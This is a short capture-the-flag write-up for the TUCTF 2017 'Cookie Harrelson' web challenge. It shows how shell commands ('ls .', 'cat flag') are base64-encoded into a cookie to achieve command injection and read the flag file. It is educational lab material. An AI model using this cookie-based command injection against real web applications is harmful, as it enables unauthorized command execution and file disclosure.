# TUCTF 2017 – Cookie Harrelson

* **Category:** web
* **Points:** 200

## Challenge

> Woody Harrelson has decided to take up web dev after learning about Cookies. Show him that he should go back to killing zombies.
>
> [http://cookieharrelson.tuctf.com](http://cookieharrelson.tuctf.com)

## Solution

Analyzing the cookies you can find the following:

```
tallahassee : Y2F0IGluZGV4LnR4dA%3D%3D
```

This cookie is base64 encoded:

```
Y2F0IGluZGV4LnR4dA==
```

Decoding it:

```
cat index.txt
```

Trying a command injection via the cookie will generate Base64 cookies in the following format:

```
cat index.txt #ls
```

So, trying to inject the Base64 version of this snippet:

```
!/bin/bash
ls .
```

Will enumerate the folder content, showing the presence of a "flag" file.
Trying to print the "flag" file with the following script (encoded via Base64 and passed into the cookie):

```
!/bin/bash
cat flag
```

Will show the flag:

```
TUCTF{D0nt_3x3cut3_Fr0m_C00k13s}
```